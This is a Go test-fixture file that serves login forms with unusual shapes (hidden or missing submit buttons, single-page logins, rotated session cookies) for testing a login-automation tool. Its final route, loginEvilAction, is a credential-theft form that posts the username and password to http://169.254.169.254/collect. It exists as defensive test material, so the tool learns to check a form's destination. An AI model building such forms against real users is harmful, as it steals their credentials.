package testfixtures

import (
	"fmt"
	"net/http"
)

// The login fixture: a deliberately ordinary session login, so the -login tests
// assert against a flow whose every branch is written down here rather than
// against a real site that may change under them.
//
// Routes, all registered in Handler:
//
//	GET  /login         the form
//	POST /login         correct credentials -> Set-Cookie + 303 to /private
//	                    anything else       -> the form again, no cookie
//	GET  /private       200 with the cookie, 403 without it
//	GET  /login-sticky  a form that is served whether or not you are signed in
//	GET  /login-anon    the form ONLY when signed out; a bare page when signed in
//	GET  /logout        clears the session cookie, 303 to /
//	GET  /grant         sets the session cookie without a form, so a test can
//	                    arrive at the login page already signed in
//	GET  /login-hidden  a form whose submit button is display:none
//	GET  /login-nobutton a form with no submit control at all
//	GET  /login-samecookie  hands out an anonymous session on GET and rotates its
//	                    VALUE on a correct POST, never introducing a new name
//	GET  /login-prefilled  a form whose username field arrives already filled
//	GET  /login-redirect   302 to /login, so a test can prove the committed page
//	                    is re-checked rather than the configured one
//	GET  /login-op      an UNCLICKABLE submit control carrying name="op", which
//	                    the handler requires — so the submission must pass the
//	                    submitter, not just call requestSubmit()
//
// /login-sticky exists to exercise the half of the success check that is
// otherwise untestable: a site that keeps rendering its login block to
// signed-in users. pagevet must report that case distinctly rather than
// silently treating a real session as a failure, or vice versa.
//
// /login-anon and /grant exist for the opposite case, and are what make the
// LOGOUT_PATH step observable: arriving at /login-anon with a session yields no
// form at all, so a sign-in against it can only succeed if the logout page was
// fetched first. That is Drupal's inline login block, modeled exactly.
const (
	// LoginUser and LoginPass are the only credentials the fixture accepts.
	LoginUser = "fixture-user"
	LoginPass = "fixture-pass"

	// LoginFormID, LoginUserField and LoginPassField mirror the shape of a real
	// login form, hyphens and all, so the identifier allowlist in
	// internal/login is exercised by something realistic.
	LoginFormID    = "fixture-login-form"
	LoginUserField = "name"
	LoginPassField = "pass"

	// LoginCookie is the session cookie the fixture sets. The name matters to
	// the tests only in that it must not already exist before the submit.
	LoginCookie = "PAGEVETSESS"

	// loginCookieValue is a fixed, obviously-fake session id. Nothing derives
	// meaning from it beyond presence.
	loginCookieValue = "fixture-session"
)

// loginForm renders the sign-in form. Every field the loader looks for is here
// and nothing else is: no JavaScript, no autofocus, no CSS. A failure in a
// -login test should mean pagevet is wrong, not that the fixture got clever.
func loginForm(action, note string) string {
	return fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<h1>sign in</h1>
%s<form id=%q method="post" action=%q>
  <label>user <input type="text" name=%q></label>
  <label>pass <input type="password" name=%q></label>
  <button type="submit">Sign in</button>
</form>
`, note, LoginFormID, action, LoginUserField, LoginPassField)
}

// loginPage serves the form.
func (f *fixture) loginPage(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		f.loginSubmit(w, r)
		return
	}
	f.html(w, loginForm("/login", ""))
}

// loginSubmit checks the posted credentials.
//
// A wrong password re-renders the form and sets NO cookie, which is the case
// that must produce a login failure. Sites that set a flash or CSRF cookie on a
// failed login exist, and that is exactly why pagevet requires the form to be
// gone as well as a cookie to be new — but this fixture stays honest and sets
// nothing, so the "no cookie change" branch is the one under test here.
func (f *fixture) loginSubmit(w http.ResponseWriter, r *http.Request) {
	// Bound the body before parsing it. The fixture is only ever posted to by
	// our own tests, but an unbounded ParseForm is a memory-exhaustion shape
	// that has no business being demonstrated in this repo.
	r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
	if err := r.ParseForm(); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		f.write(w, "bad form")
		return
	}
	if r.PostFormValue(LoginUserField) != LoginUser || r.PostFormValue(LoginPassField) != LoginPass {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		f.write(w, loginForm("/login", "<p id=\"login-error\">wrong username or password</p>\n"))
		return
	}

	setSession(w)
	// 303 rather than 302: the browser must follow it with GET, not repost the
	// credentials at the destination.
	http.Redirect(w, r, "/private", http.StatusSeeOther)
}

// private is the page the whole feature exists for: 403 to a stranger, 200 to a
// session. A -login test that loads this in a tab other than the one that
// signed in is asserting that the cookie jar really is shared.
func (f *fixture) private(w http.ResponseWriter, r *http.Request) {
	if !signedIn(r) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusForbidden)
		f.write(w, `<!doctype html><meta charset="utf-8"><title>forbidden</title><h1>403</h1>`)
		return
	}
	f.html(w, `<!doctype html><meta charset="utf-8"><title>private</title><h1>signed in</h1>`)
}

// loginSticky sets the session but keeps serving the form, modeling a site
// whose login block is rendered on every page regardless of session state.
//
// pagevet treats this as a failure — it cannot distinguish it from a sign-in
// that silently did nothing — and the test on this route pins the wording of
// that error, because the wording is the only thing that tells a user which of
// the two checks to go and look at.
func (f *fixture) loginSticky(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		setSession(w)
	}
	f.html(w, loginForm("/login-sticky", ""))
}

// loginAnon serves the form only to a signed-out visitor, the way a site that
// renders its login block for anonymous users alone does.
//
// A test pointing LOGIN_PATH here after /grant has set a session gets no form,
// and therefore fails — unless LOGOUT_PATH cleared the session first. That is
// what turns "the logout ran, and ran before the login" into an assertion
// rather than a hope.
func (f *fixture) loginAnon(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		f.loginSubmit(w, r)
		return
	}
	if signedIn(r) {
		f.html(w, `<!doctype html><meta charset="utf-8"><title>signed in</title>`+
			`<h1>already signed in</h1><p>no form here</p>`)
		return
	}
	f.html(w, loginForm("/login-anon", ""))
}

// loginHidden serves a form whose submit control cannot be clicked.
//
// This is the shape that broke the first implementation, taken from a real
// Drupal site: <input type="submit" value=""> styled entirely in CSS. chromedp
// waits for a node to be VISIBLE before clicking it, so a zero-size or
// display:none control makes the click hang until its deadline. The submit must
// still go through, by requestSubmit().
func (f *fixture) loginHidden(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		f.loginSubmit(w, r)
		return
	}
	f.html(w, fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<form id=%q method="post" action="/login-hidden">
  <input type="text" name=%q>
  <input type="password" name=%q>
  <input type="submit" value="" style="display:none">
</form>
`, LoginFormID, LoginUserField, LoginPassField))
}

// loginNoButton serves a form with no submit control whatsoever, which is legal
// HTML and does happen on forms driven entirely by script.
func (f *fixture) loginNoButton(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		f.loginSubmit(w, r)
		return
	}
	f.html(w, fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<form id=%q method="post" action="/login-nobutton">
  <input type="text" name=%q>
  <input type="password" name=%q>
</form>
`, LoginFormID, LoginUserField, LoginPassField))
}

// logout clears the session cookie.
//
// The deletion cookie repeats Path, Secure and HttpOnly because a browser
// matches on those: a Set-Cookie that differs in any of them creates a second
// cookie instead of removing the first, which would leave the session intact
// and the test passing for the wrong reason.
func (f *fixture) logout(w http.ResponseWriter, r *http.Request) {
	http.SetCookie(w, &http.Cookie{
		Name:     LoginCookie,
		Value:    "",
		Path:     "/",
		MaxAge:   -1,
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
	})
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

// grant hands out a session with no form involved, so a test can put the
// browser into the signed-in state that LOGOUT_PATH is supposed to undo.
func (f *fixture) grant(w http.ResponseWriter, _ *http.Request) {
	setSession(w)
	f.html(w, `<!doctype html><meta charset="utf-8"><title>granted</title><h1>session granted</h1>`)
}

// signedIn reports whether the request carries the fixture's session cookie.
func signedIn(r *http.Request) bool {
	c, err := r.Cookie(LoginCookie)
	return err == nil && c.Value == loginCookieValue
}

// maxFormBytes bounds a posted login form. Six short fields never approach it.
const maxFormBytes = 64 << 10

// setSession issues the fixture's session cookie.
//
// All three of HttpOnly, SameSite and Secure are set, because a fixture that
// models a login cookie badly teaches the wrong thing and because gosec's G124
// is right to insist.
//
// Secure works here despite httptest serving plain HTTP: Chrome counts
// http://127.0.0.1 as a trustworthy origin, so a Secure cookie is both accepted
// and sent back on loopback. FLAKE RULE 1 in server.go — never rewrite
// srv.URL's host to "localhost" — is what keeps that true.
func setSession(w http.ResponseWriter) {
	http.SetCookie(w, &http.Cookie{
		Name:     LoginCookie,
		Value:    loginCookieValue,
		Path:     "/",
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
	})
}

// anonSession is the pre-login session value handed out by /login-samecookie.
const anonSession = "anonymous-session"

// loginSameCookie models the PHP/Express flow that a new-cookie-NAME check got
// wrong: the login page issues a session cookie to anonymous visitors, and a
// successful POST authenticates that same session by rotating its value.
//
// The cookie NAME never changes, so nothing new ever appears in the jar. Only a
// value comparison sees the sign-in at all.
func (f *fixture) loginSameCookie(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
		if err := r.ParseForm(); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			f.write(w, "bad form")
			return
		}
		if r.PostFormValue(LoginUserField) != LoginUser || r.PostFormValue(LoginPassField) != LoginPass {
			// Wrong credentials keep the SAME anonymous value, so this route
			// still fails closed.
			setNamedSession(w, anonSession)
			f.html(w, loginForm("/login-samecookie", `<p id="login-error">no</p>`))
			return
		}
		setNamedSession(w, loginCookieValue) // same name, new value
		http.Redirect(w, r, "/private", http.StatusSeeOther)
		return
	}
	setNamedSession(w, anonSession)
	f.html(w, loginForm("/login-samecookie", ""))
}

// loginPrefilled serves a form whose username input already carries a value,
// the way a server that remembers the last user does. SendKeys alone would
// append to it and submit "guesteditor".
func (f *fixture) loginPrefilled(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		f.loginSubmit(w, r)
		return
	}
	f.html(w, fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<form id=%q method="post" action="/login-prefilled">
  <input type="text" name=%q value="guest">
  <input type="password" name=%q>
  <input type="submit" value="Sign in">
</form>
`, LoginFormID, LoginUserField, LoginPassField))
}

// loginRedirect bounces to /login, so a test can assert that the page which
// actually commits is the one re-checked against the address policy.
func (f *fixture) loginRedirect(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "/login", http.StatusFound)
}

// setNamedSession issues the session cookie with an explicit value.
func setNamedSession(w http.ResponseWriter, value string) {
	http.SetCookie(w, &http.Cookie{
		Name:     LoginCookie,
		Value:    value,
		Path:     "/",
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
	})
}

// LoginOpField and LoginOpValue are the submit control's name and value on
// /login-op. Drupal posts exactly this pair as op=.
const (
	LoginOpField = "op"
	LoginOpValue = "Log in"
)

// loginOp requires the submit control's name/value to reach the server, and
// makes that control unclickable so the click path cannot supply it.
//
// This is the shape a bare requestSubmit() gets wrong: it fires the submit
// event but contributes no submitter, so op= never arrives and the server
// rejects credentials that are perfectly correct.
func (f *fixture) loginOp(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
		if err := r.ParseForm(); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			f.write(w, "bad form")
			return
		}
		okCreds := r.PostFormValue(LoginUserField) == LoginUser &&
			r.PostFormValue(LoginPassField) == LoginPass
		if !okCreds || r.PostFormValue(LoginOpField) != LoginOpValue {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusOK)
			f.write(w, loginFormWithOp("<p id=\"login-error\">missing op or bad credentials</p>\n"))
			return
		}
		setSession(w)
		http.Redirect(w, r, "/private", http.StatusSeeOther)
		return
	}
	f.html(w, loginFormWithOp(""))
}

// loginFormWithOp renders /login-op's form. The submit control is display:none
// so it can never be clicked, which is what forces the requestSubmit path.
func loginFormWithOp(note string) string {
	return fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
%s<form id=%q method="post" action="/login-op">
  <input type="text" name=%q>
  <input type="password" name=%q>
  <input type="submit" name=%q value=%q style="display:none">
</form>
`, note, LoginFormID, LoginUserField, LoginPassField, LoginOpField, LoginOpValue)
}

// loginSPA models a single-page login: the submit handler calls
// preventDefault(), authenticates over fetch, and removes the form. No document
// navigation ever happens.
//
// Requiring a navigation to conclude a submission burned the whole login budget
// here and reported failure on a sign-in that had plainly worked.
func (f *fixture) loginSPA(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
		if err := r.ParseForm(); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		if r.PostFormValue(LoginUserField) != LoginUser || r.PostFormValue(LoginPassField) != LoginPass {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		setSession(w)
		w.WriteHeader(http.StatusNoContent)
		return
	}
	f.html(w, fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<div id="app">
<form id=%q method="post" action="/login-spa">
  <input type="text" name=%q>
  <input type="password" name=%q>
  <button type="submit">Sign in</button>
</form>
</div>
<script>
document.getElementById(%q).addEventListener("submit", async (e) => {
  e.preventDefault();
  const body = new URLSearchParams(new FormData(e.target));
  const r = await fetch("/login-spa", {method: "POST", body});
  if (r.ok) { document.getElementById("app").innerHTML = "<h1>signed in</h1>"; }
});
</script>
`, LoginFormID, LoginUserField, LoginPassField, LoginFormID))
}

// loginSecondButton puts a display:none submit control BEFORE the usable one.
//
// querySelector returns only the first match, so picking "the" submit control
// without checking each in turn reports the form as unclickable and hands the
// hidden control to requestSubmit — whose name/value then produce a different
// request than clicking the button a person would.
func (f *fixture) loginSecondButton(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
		if err := r.ParseForm(); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			f.write(w, "bad form")
			return
		}
		okCreds := r.PostFormValue(LoginUserField) == LoginUser &&
			r.PostFormValue(LoginPassField) == LoginPass
		// The hidden control would post op=decoy; only the visible one is right.
		if !okCreds || r.PostFormValue(LoginOpField) != LoginOpValue {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.WriteHeader(http.StatusOK)
			f.write(w, "<p>wrong submitter or credentials</p>")
			return
		}
		setSession(w)
		http.Redirect(w, r, "/private", http.StatusSeeOther)
		return
	}
	f.html(w, fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<form id=%q method="post" action="/login-secondbutton">
  <input type="text" name=%q>
  <input type="password" name=%q>
  <input type="submit" name=%q value="decoy" style="display:none">
  <input type="submit" name=%q value=%q>
</form>
`, LoginFormID, LoginUserField, LoginPassField, LoginOpField, LoginOpField, LoginOpValue))
}

// loginOutside associates the password input with the form through the form=
// attribute while placing it outside the form element. That is valid HTML: the
// browser includes it in form.elements and submits it normally, but a
// descendant selector never finds it.
func (f *fixture) loginOutside(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		f.loginSubmit(w, r)
		return
	}
	f.html(w, fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<form id=%q method="post" action="/login-outside">
  <input type="text" name=%q>
  <input type="submit" value="Sign in">
</form>
<div class="sidebar">
  <input type="password" name=%q form=%q>
</div>
`, LoginFormID, LoginUserField, LoginPassField, LoginFormID))
}

// loginEvilAction serves an ordinary-looking form on an allowed page whose
// action posts the credentials to another origin. A cross-origin form
// submission needs no CORS permission, so nothing in the browser stops it —
// the destination has to be checked before anything is typed.
func (f *fixture) loginEvilAction(w http.ResponseWriter, _ *http.Request) {
	f.html(w, fmt.Sprintf(`<!doctype html>
<meta charset="utf-8">
<title>sign in</title>
<form id=%q method="post" action="http://169.254.169.254/collect">
  <input type="text" name=%q>
  <input type="password" name=%q>
  <input type="submit" value="Sign in">
</form>
`, LoginFormID, LoginUserField, LoginPassField))
}
